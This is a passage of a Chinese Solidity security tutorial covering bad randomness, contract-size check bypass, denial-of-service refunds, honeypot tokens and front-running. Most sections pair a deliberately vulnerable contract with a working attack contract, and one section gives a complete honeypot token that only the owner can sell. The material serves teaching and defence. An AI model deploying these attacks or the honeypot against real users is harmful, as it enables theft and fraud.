<h1 id="S07-坏随机数"><a href="#S07-坏随机数" class="headerlink" title="S07. 坏随机数"></a>S07. 坏随机数</h1><p>智能合约的坏随机数（Bad Randomness）漏洞和预防方法，这个漏洞经常在 NFT 和 GameFi 中出现，包括 Meebits，Loots，Wolf Game等。</p>
<h2 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h2><p>很多以太坊上的应用都需要用到随机数，例如<code>NFT</code>随机抽取<code>tokenId</code>、抽盲盒、<code>gamefi</code>战斗中随机分胜负等等。但是由于以太坊上所有数据都是公开透明（<code>public</code>）且确定性（<code>deterministic</code>）的，它没有其他编程语言一样给开发者提供生成随机数的方法，例如<code>random()</code>。很多项目方不得不使用链上的伪随机数生成方法，例如 <code>blockhash()</code> 和 <code>keccak256()</code> 方法。</p>
<p>坏随机数漏洞：攻击者可以事先计算这些伪随机数的结果，从而达到他们想要的目的，例如铸造任何他们想要的稀有<code>NFT</code>而非随机抽取。更多的内容可以阅读 <a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/tree/main/39_Random">WTF Solidity极简教程 第39讲：伪随机数</a>。</p>
<h2 id="坏随机数案例"><a href="#坏随机数案例" class="headerlink" title="坏随机数案例"></a>坏随机数案例</h2><p>下面我们学习一个有坏随机数漏洞的 NFT 合约： BadRandomness.sol。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract BadRandomness is ERC721 &#123;<br>    uint256 totalSupply;<br><br>    // 构造函数，初始化NFT合集的名称、代号<br>    constructor() ERC721(&quot;&quot;, &quot;&quot;)&#123;&#125;<br><br>    // 铸造函数：当输入的 luckyNumber 等于随机数时才能mint<br>    function luckyMint(uint256 luckyNumber) external &#123;<br>        uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // get bad random number<br>        require(randomNumber == luckyNumber, &quot;Better luck next time!&quot;);<br><br>        _mint(msg.sender, totalSupply); // mint<br>        totalSupply++;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>它有一个主要的铸造函数 <code>luckyMint()</code>，用户调用时输入一个 <code>0-99</code> 的数字，如果和链上生成的伪随机数 <code>randomNumber</code> 相等，即可铸造幸运 NFT。伪随机数使用 <code>blockhash</code> 和 <code>block.timestamp</code> 声称。这个漏洞在于用户可以完美预测生成的随机数并铸造NFT。</p>
<p>下面我们写个攻击合约 <code>Attack.sol</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Attack &#123;<br>    function attackMint(BadRandomness nftAddr) external &#123;<br>        // 提前计算随机数<br>        uint256 luckyNumber = uint256(<br>            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))<br>        ) % 100;<br>        // 利用 luckyNumber 攻击<br>        nftAddr.luckyMint(luckyNumber);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>攻击函数 <code>attackMint()</code>中的参数为 <code>BadRandomness</code>合约地址。在其中，我们计算了随机数 <code>luckyNumber</code>，然后将它作为参数输入到 <code>luckyMint()</code> 函数完成攻击。由于<code>attackMint()</code>和<code>luckyMint()</code>将在同一个区块中调用，<code>blockhash</code>和<code>block.timestamp</code>是相同的，利用他们生成的随机数也相同。</p>
<h1 id="S08-绕过合约长度检查"><a href="#S08-绕过合约长度检查" class="headerlink" title="S08. 绕过合约长度检查"></a>S08. 绕过合约长度检查</h1><p>有一些项目为了限制程序员，会用到isContract()方法来校验msg.sender限制为外部账户(EOA)，而非合约地址</p>
<p>这个函数利用的是<code>extcodesize</code>获取改地址所存储的bytecode长度(runtime)，如果大于0，这判断为合约，否则就是EOA（用户）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 利用 extcodesize 检查是否为合约<br>function isContract(address account) public view returns (bool) &#123;<br>    // extcodesize &gt; 0 的地址一定是合约地址<br>    // 但是合约在构造函数时候 extcodesize 为0<br>    uint size;<br>    assembly &#123;<br>        size := extcodesize(account)<br>    &#125;<br>    return size &gt; 0;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里有一个漏洞，就是在合约在被创建的时候，<code>runtime bytecode</code> 还没有被存储到地址上，因此 <code>bytecode</code> 长度为0。也就是说，如果我们将逻辑写在合约的构造函数 <code>constructor</code> 中的话，就可以绕过 <code>isContract()</code> 检查。</p>
<p><img src="/img/web3/S08-1.png" srcset="/img/loading.gif" lazyload alt="S08-1"></p>
<h2 id="漏洞例子"><a href="#漏洞例子" class="headerlink" title="漏洞例子"></a>漏洞例子</h2><p>下面我们来看一个例子：<code>ContractCheck</code>合约是一个 freemint ERC20 合约，铸造函数 <code>mint()</code> 中使用了 <code>isContract()</code> 函数来阻止合约地址的调用，防止科学家批量铸造。每次调用 <code>mint()</code> 可以铸造 100 枚代币。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 用extcodesize检查是否为合约地址<br>contract ContractCheck is ERC20 &#123;<br>    // 构造函数：初始化代币名称和代号<br>    constructor() ERC20(&quot;&quot;, &quot;&quot;) &#123;&#125;<br>    <br>    // 利用 extcodesize 检查是否为合约<br>    function isContract(address account) public view returns (bool) &#123;<br>        // extcodesize &gt; 0 的地址一定是合约地址<br>        // 但是合约在构造函数时候 extcodesize 为0<br>        uint size;<br>        assembly &#123;<br>            size := extcodesize(account)<br>        &#125;<br>        return size &gt; 0;<br>    &#125;<br><br>    // mint函数，只有非合约地址能调用（有漏洞）<br>    function mint() public &#123;<br>        require(!isContract(msg.sender), &quot;Contract not allowed!&quot;);<br>        _mint(msg.sender, 100);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>我们写一个攻击合约，在 <code>constructor</code> 中多次调用 <code>ContractCheck</code> 合约中的 <code>mint()</code> 函数，批量铸造 <code>1000</code> 枚代币：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 利用构造函数的特点攻击<br>contract NotContract &#123;<br>    bool public isContract;<br>    address public contractCheck;<br><br>    // 当合约正在被创建时，extcodesize (代码长度) 为 0，因此不会被 isContract() 检测出。<br>    constructor(address addr) &#123;<br>        contractCheck = addr;<br>        isContract = ContractCheck(addr).isContract(address(this));<br>        // This will work<br>        for(uint i; i &lt; 10; i++)&#123;<br>            ContractCheck(addr).mint();<br>        &#125;<br>    &#125;<br><br>    // 合约创建好以后，extcodesize &gt; 0，isContract() 可以检测<br>    function mint() external &#123;<br>        ContractCheck(contractCheck).mint();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>如果我们之前讲的是正确的话，在构造函数调用 <code>mint()</code> 可以绕过 <code>isContract()</code> 的检查成功铸造代币，那么函数将成功部署，并且状态变量 <code>isContract</code> 会在构造函数赋值 <code>false</code>。而在合约部署之后，<code>runtime bytecode</code> 已经被存储在合约地址上了，<code>extcodesize &gt; 0</code>， <code>isContract()</code> 能够成功阻止铸造，调用 <code>mint()</code> 函数将失败。</p>
<h2 id="预防办法-3"><a href="#预防办法-3" class="headerlink" title="预防办法"></a>预防办法</h2><p>你可以使用 <code>(tx.origin == msg.sender)</code> 来检测调用者是否为合约。如果调用者为 EOA，那么<code>tx.origin</code>和<code>msg.sender</code>相等；如果它们俩不相等，调用者为合约。在<a target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-3074">eip-3074</a>中，这样检查合约的方式，会失效。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function realContract(address account) public view returns (bool) &#123;<br>    return (tx.origin == msg.sender);<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>这一讲，我们介绍了合约长度检查可以被绕过的漏洞，并介绍预防的方法。如果一个地址的 <code>extcodesize &gt; 0</code>，则该地址一定为合约；但如果 <code>extcodesize = 0</code>，该地址既可能为 <code>EOA</code>，也可能为正在创建状态的合约。</p>
<h1 id="S09-拒绝服务"><a href="#S09-拒绝服务" class="headerlink" title="S09. 拒绝服务"></a>S09. 拒绝服务</h1><p>在 Web2 中，拒绝服务攻击（DoS）是指通过向服务器发送大量垃圾信息或干扰信息的方式，导致服务器无法向正常用户提供服务的现象。而在 Web3，它指的是利用漏洞使得智能合约无法正常提供服务。</p>
<p>在 2022 年 4 月，一个很火的 NFT 项目名为 Akutar，他们使用<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/tree/main/35_DutchAuction">荷兰拍卖</a>进行公开发行，筹集了 11,539.5 ETH，非常成功。之前持有他们社区 Pass 的参与者会得到 0.5 ETH 的退款，但是他们处理退款的时候，发现智能合约不能正常运行，全部资金被永远锁在了合约里。他们的智能合约有拒绝服务漏洞。</p>
<p><img src="/img/web3/S09-1.png" srcset="/img/loading.gif" lazyload alt="S09-1"></p>
<h2 id="漏洞例子-1"><a href="#漏洞例子-1" class="headerlink" title="漏洞例子"></a>漏洞例子</h2><p>下面我们学习一个简化了的 Akutar 合约，名字叫 <code>DoSGame</code>。这个合约逻辑很简单，游戏开始时，玩家们调用 <code>deposit()</code> 函数往合约里存款，合约会记录下所有玩家地址和相应的存款；当游戏结束时，<code>refund()</code>函数被调用，将 ETH 依次退款给所有玩家。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br><br>// 有DoS漏洞的游戏，玩家们先存钱，游戏结束后，调用refund退钱。<br>contract DoSGame &#123;<br>    bool public refundFinished;<br>    mapping(address =&gt; uint256) public balanceOf;<br>    address[] public players;<br><br>    // 所有玩家存ETH到合约里<br>    function deposit() external payable &#123;<br>        require(!refundFinished, &quot;Game Over&quot;);<br>        require(msg.value &gt; 0, &quot;Please donate ETH&quot;);<br>        // 记录存款<br>        balanceOf[msg.sender] = msg.value;<br>        // 记录玩家地址<br>        players.push(msg.sender);<br>    &#125;<br><br>    // 游戏结束，退款开始，所有玩家将依次收到退款<br>    function refund() external &#123;<br>        require(!refundFinished, &quot;Game Over&quot;);<br>        uint256 pLength = players.length;<br>        // 通过循环给所有玩家退款<br>        for(uint256 i; i &lt; pLength; i++)&#123;<br>            address player = players[i];<br>            uint256 refundETH = balanceOf[player];<br>            (bool success, ) = player.call&#123;value: refundETH&#125;(&quot;&quot;);<br>            require(success, &quot;Refund Fail!&quot;);<br>            balanceOf[player] = 0;<br>        &#125;<br>        refundFinished = true;<br>    &#125;<br><br>    function balance() external view returns(uint256)&#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>这里的漏洞在于，<code>refund()</code> 函数中利用循环退款的时候，是使用的 <code>call</code> 函数，将激活目标地址的回调函数，如果目标地址为一个恶意合约，在回调函数中加入了恶意逻辑，退款将不能正常进行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">(bool success, ) = player.call&#123;value: refundETH&#125;(&quot;&quot;);<br></code></pre></td></tr></table></figure>



<p>下面我们写个攻击合约， <code>attack()</code> 函数中将调用 <code>DoSGame</code> 合约的 <code>deposit()</code> 存款并参与游戏；<code>fallback()</code> 回调函数将回退所有向该合约发送<code>ETH</code>的交易，对<code>DoSGame</code> 合约中的 DoS 漏洞进行了攻击，所有退款将不能正常进行，资金被锁在合约中，就像 Akutar 合约中的一万多枚 ETH 一样。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Attack &#123;<br>    // 退款时进行DoS攻击<br>    fallback() external payable&#123;<br>        revert(&quot;DoS Attack!&quot;);<br>    &#125;<br><br>    // 参与DoS游戏并存款<br>    function attack(address gameAddr) external payable &#123;<br>        DoSGame dos = DoSGame(gameAddr);<br>        dos.deposit&#123;value: msg.value&#125;();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>测试场景一：正常使用是否可以成功退款</p>
<p>测试代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract DoSGameAttackTest is Test &#123;<br>    DoSGame public doSGame;<br>    DoSGameAttack public doSGameAttack;<br>    address public user;<br>    function setUp() public &#123;<br>        doSGame = new DoSGame(); // 部署 DoSGame 合约<br>        // 创建测试用户<br>        user = makeAddr(&quot;testUser&quot;);<br>        // 给用户转账<br>        vm.deal(user, 10 * 1e18);<br>    &#125;<br>    function test_deposit() public &#123;<br>        vm.startPrank(user);<br>        uint256 Before = doSGame.balance();<br>        console.log(&quot;doSGame.balance Before is  &quot;, Before);<br>        doSGame.deposit&#123;value: 3 * 1e18&#125;();// 往 bank充值3颗ETH<br>        uint256 After = doSGame.balance();<br>        console.log(&quot;doSGame.balance After is  &quot;, After);<br>        doSGame.refund(); // 成功退款<br>        uint256 End = doSGame.balance();<br>        console.log(&quot;doSGame.balance End is  &quot;, End);<br>        vm.stopPrank();<br>    &#125;&#125;<br></code></pre></td></tr></table></figure>

<p>正常场景的测试结果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell">Logs:<br>  doSGame.balance Before is   0<br>  doSGame.balance After is   3000000000000000000<br>  doSGame.balance End is   0<br><br>Traces:<br>  [123843] DoSGameAttackTest::test_deposit()<br>    ├─ [0] VM::startPrank(testUser: [0xF7DFAA7B4230fdc795e8C6430834Cf309aF893bA])<br>    │   └─ ← [Return]<br>    ├─ [378] DoSGame::balance() [staticcall]<br>    │   └─ ← [Return] 0<br>    ├─ [0] console::log(&quot;doSGame.balance Before is  &quot;, 0) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [68935] DoSGame::deposit&#123;value: 3000000000000000000&#125;()<br>    │   └─ ← [Stop]<br>    ├─ [378] DoSGame::balance() [staticcall]<br>    │   └─ ← [Return] 3000000000000000000 [3e18]<br>    ├─ [0] console::log(&quot;doSGame.balance After is  &quot;, 3000000000000000000 [3e18]) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [28477] DoSGame::refund()<br>    │   ├─ [0] testUser::fallback&#123;value: 3000000000000000000&#125;()<br>    │   │   └─ ← [Stop]<br>    │   └─ ← [Stop]<br>    ├─ [378] DoSGame::balance() [staticcall]<br>    │   └─ ← [Return] 0<br>    ├─ [0] console::log(&quot;doSGame.balance End is  &quot;, 0) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [0] VM::stopPrank()<br>    │   └─ ← [Return]<br>    └─ ← [Stop]<br><br></code></pre></td></tr></table></figure>

<p>测试场景二：攻击合约测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function test_DoSGameAttack() public &#123;<br>    vm.startPrank(user);<br>    uint256 Before = doSGame.balance();<br>    console.log(&quot;doSGame.balance Before is  &quot;, Before);<br>    doSGameAttack = new DoSGameAttack(); //实例化攻击合约<br>    doSGameAttack.attack&#123;value: 3 * 1e18&#125;(address(doSGame));<br>    doSGame.refund();<br>    uint256 After = doSGame.balance();<br>    console.log(&quot;doSGame.balance After is  &quot;, After);<br>    vm.stopPrank();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>运行结果：无法赎回，为什么呢？因为在攻击合约里面定义了fallback回调函数，里面抛出了一个revert导致回调失败，无法赎回</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">[268726] DoSGameAttackTest::test_DoSGameAttack()<br>  ├─ [0] VM::startPrank(testUser: [0xF7DFAA7B4230fdc795e8C6430834Cf309aF893bA])<br>  │   └─ ← [Return]<br>  ├─ [378] DoSGame::balance() [staticcall]<br>  │   └─ ← [Return] 0<br>  ├─ [0] console::log(&quot;doSGame.balance Before is  &quot;, 0) [staticcall]<br>  │   └─ ← [Stop]<br>  ├─ [106751] → new DoSGameAttack@0xb8BE0Cc57897f40C22410548f33B2750cb01E14f<br>  │   └─ ← [Return] 533 bytes of code<br>  ├─ [76392] DoSGameAttack::attack&#123;value: 3000000000000000000&#125;(DoSGame: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])<br>  │   ├─ [68935] DoSGame::deposit&#123;value: 3000000000000000000&#125;()<br>  │   │   └─ ← [Stop]<br>  │   └─ ← [Stop]<br>  ├─ [8756] DoSGame::refund()<br>  │   ├─ [335] DoSGameAttack::fallback&#123;value: 3000000000000000000&#125;()<br>  │   │   └─ ← [Revert] DoS Attack!<br>  │   └─ ← [Revert] Refund Fail!<br>  └─ ← [Revert] Refund Fail!<br></code></pre></td></tr></table></figure>

<h2 id="预防方法"><a href="#预防方法" class="headerlink" title="预防方法"></a>预防方法</h2><p>很多逻辑错误都可能导致智能合约拒绝服务，所以开发者在写智能合约时要万分谨慎。以下是一些需要特别注意的地方：</p>
<ol>
<li>外部合约的函数调用（例如 <code>call</code>）失败时不会使得重要功能卡死，比如将上面漏洞合约中的 <code>require(success, &quot;Refund Fail!&quot;);</code> 去掉，退款在单个地址失败时仍能继续运行。</li>
<li>合约不会出乎意料的自毁。</li>
<li>合约不会进入无限循环。</li>
<li><code>require</code> 和 <code>assert</code> 的参数设定正确。</li>
<li>退款时，让用户从合约自行领取（pull），而非批量发送给用户(push)。</li>
<li>确保回调函数不会影响正常合约运行。</li>
<li>确保当合约的参与者（例如 <code>owner</code>）永远缺席时，合约的主要业务仍能顺利运行。</li>
</ol>
<h1 id="S10-貔貅"><a href="#S10-貔貅" class="headerlink" title="S10. 貔貅"></a>S10. 貔貅</h1><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Pixiu">貔貅</a>是中国的一个神兽，因为在天庭犯了戒，被玉帝揍的肛门封闭了，只能吃不能拉，可以帮人们聚财。但在Web3中，貔貅变为了不详之兽，韭菜的天敌。貔貅盘的特点：投资人只能买不能卖，仅有项目方地址能卖出。（英文习惯叫蜜罐代币 honeypot token）。</p>
<p>通常一个貔貅盘有如下的生命周期：</p>
<ol>
<li>恶意项目方部署貔貅代币合约。</li>
<li>宣传貔貅代币让散户上车，由于只能买不能卖，代币价格会一路走高。</li>
<li>项目方<code>rug pull</code>卷走资金</li>
</ol>
<p>介绍一个极简的ERC20代币貔貅合约<code>Pixiu</code>。在该合约中，只有合约拥有者可以在<code>uniswap</code>出售代币，其他地址不能。</p>
<p><code>Pixiu</code> 有一个状态变量<code>pair</code>，用于记录<code>uniswap</code>中 <code>Pixiu-ETH LP</code>的币对地址。它主要有三个函数：</p>
<ol>
<li>构造函数：初始化代币的名称和代号，并根据 <code>uniswap</code> 和 <code>create2</code> 的原理计算<code>LP</code>合约地址，具体内容可以参考 <a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/blob/main/25_Create2/readme.md">WTF Solidity 第25讲: Create2</a>。这个地址会在 <code>_update()</code> 函数中用到。</li>
<li><code>mint()</code>：铸造函数，仅 <code>owner</code> 地址可以调用，用于铸造 <code>Pixiu</code> 代币。</li>
<li><code>_update()</code>：<code>ERC20</code>代币在被转账前会调用的函数。在其中，我们限制了当转账的目标地址 <code>to</code> 为 <code>LP</code> 的时候，也就是韭菜卖出的时候，交易会 <code>revert</code>；只有调用者为<code>owner</code>的时候能够成功。这也是貔貅合约的核心。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 极简貔貅ERC20代币，只能买，不能卖<br>contract HoneyPot is ERC20, Ownable &#123;<br>    address public pair;<br><br>    // 构造函数：初始化代币名称和代号<br>    constructor() ERC20(&quot;HoneyPot&quot;, &quot;Pi Xiu&quot;) &#123;<br>        address factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // goerli uniswap v2 factory<br>        address tokenA = address(this); // 貔貅代币地址<br>        address tokenB = 0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6; //  goerli WETH<br>        (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); //将tokenA和tokenB按大小排序<br>        bytes32 salt = keccak256(abi.encodePacked(token0, token1));<br>        // calculate pair address<br>        pair = address(uint160(uint(keccak256(abi.encodePacked(<br>        hex&#x27;ff&#x27;,<br>        factory,<br>        salt,<br>        hex&#x27;96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f&#x27;<br>        )))));<br>    &#125;<br>    <br>    /**<br>     * 铸造函数，只有合约所有者可以调用<br>     */<br>    function mint(address to, uint amount) public onlyOwner &#123;<br>        _mint(to, amount);<br>    &#125;<br><br>    /**<br>     * @dev See &#123;ERC20-_update&#125;.<br>     * 貔貅函数：只有合约拥有者可以卖出<br>    */<br>    function _update(<br>      address from,<br>      address to,<br>      uint256 amount<br>  ) internal virtual override &#123;<br>     if(to == pair)&#123;<br>        require(from == owner(), &quot;Can not Transfer&quot;);<br>      &#125;<br>      super._update(from, to, amount);<br>  &#125;<br>  // 为什么是_update？<br>  // 注意override是重写，重写了父合约ERC20的_update<br>  // 而父合约ERC20的_update方法，就是更新所有人，就是转移，本来属于你的1个币转移给另一个人了，这就是update<br>  // 这里重写_update 当转移的to地址是pair地址时，触发校验，要求from必须是 owner，<br>  // 也就是说只有owner才可以向pair合约转账<br>  // 也就代表自由owner才可以向uniswap卖币<br>&#125;<br></code></pre></td></tr></table></figure>

<h1 id="S11-抢先交易"><a href="#S11-抢先交易" class="headerlink" title="S11. 抢先交易"></a>S11. 抢先交易</h1><h3 id="链上抢跑"><a href="#链上抢跑" class="headerlink" title="链上抢跑"></a>链上抢跑</h3><p>链上抢跑指的是搜索者或矿工通过调高<code>gas</code>或其他方法将自己的交易安插在其他交易之前，来攫取价值。在区块链中，矿工可以通过打包、排除或重新排序他们产生的区块中的交易来获得一定的利润，而<code>MEV</code>是衡量这种利润的指标。</p>
<p>在用户的交易被矿工打包进以太坊区块链之前，大部分交易会汇集到Mempool（交易内存池）中，矿工在这里寻找费用高的交易优先打包出块，实现利益最大化。通常来说，gas price越高的交易，越容易被打包。同时，一些<code>MEV</code>机器人也会搜索<code>mempool</code>中有利可图的交易。比如，一笔在去中心化交易所中滑点设置过高的<code>swap</code>交易可能会被三明治攻击：通过调整gas，套利者会在这笔交易之前插一个买单，再在之后发送一个卖单，并从中盈利。这等效于哄抬市价。</p>
<p><img src="/img/web3/S11-1.png" srcset="/img/loading.gif" lazyload alt="S11-1"></p>
<h2 id="抢跑实践"><a href="#抢跑实践" class="headerlink" title="抢跑实践"></a>抢跑实践</h2><p>如果你学会了抢跑，你就算是入门的币圈科学家了。接下来，让我们实践一下，抢跑一笔铸造NFT的交易。我们将会用到的工具：</p>
<ul>
<li><code>Foundry</code>的<code>anvil</code>工具搭建本地测试链，请提前安装好 <a target="_blank" rel="noopener" href="https://book.getfoundry.sh/getting-started/installation">foundry</a>。</li>
<li><code>remix</code>进行NFT合约的部署和铸造</li>
<li><code>etherjs</code>脚本监听<code>mempool</code>并进行抢跑。</li>
</ul>
<p><strong>1. 启动Foundry本地测试链：</strong> 在安装好 <code>foundry</code> 之后，在命令行输入 <code>anvil --chain-id 1234 -b 10</code> 搭建本地测试链，chain-id 为 1234，每 10 秒产出一个区块。搭建成功后，它会在显示一些测试账户的地址和私钥，每个账户有 10000 ETH。你可以使用它们进行测试。</p>
<p><strong>2. 将Remix连接到测试链：</strong> 打开 Remix 的部署页面，打开左上角的<code>Environment</code>下拉菜单，选<code>Foundry Provider</code>即可将 Remix 连接到测试链。</p>
<p><strong>3. 部署NFT合约：</strong> 在 Remix 上部署一个简单的 freemint（免费铸造）NFT合约。它有一个<code>mint()</code>，用于免费铸造NFT。</p>
